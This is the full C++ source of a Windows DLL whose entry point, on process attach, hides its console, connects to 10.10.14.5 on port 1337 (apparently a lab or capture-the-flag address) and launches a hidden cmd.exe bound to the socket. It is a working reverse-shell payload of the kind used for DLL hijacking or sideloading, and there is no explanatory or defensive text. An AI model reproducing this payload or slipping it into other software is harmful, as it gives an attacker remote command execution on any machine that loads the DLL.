// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

void revshell() {

#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"10.10.14.5"
#endif
	FreeConsole();
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return;
	}

	struct addrinfo *result, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(CLIENT_IP, "1337", &hints,&result);
	SOCKET sockt = WSASocket(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, NULL, NULL);

	connect(sockt, result->ai_addr, (int)result->ai_addrlen);

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; sinfo.wShowWindow = SW_HIDE;
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	wchar_t executablePath[] = L"cmd";
	CreateProcessW(NULL, executablePath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
	WaitForSingleObject(pinfo.hProcess, INFINITE);

	return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)	
{
	;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		revshell();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
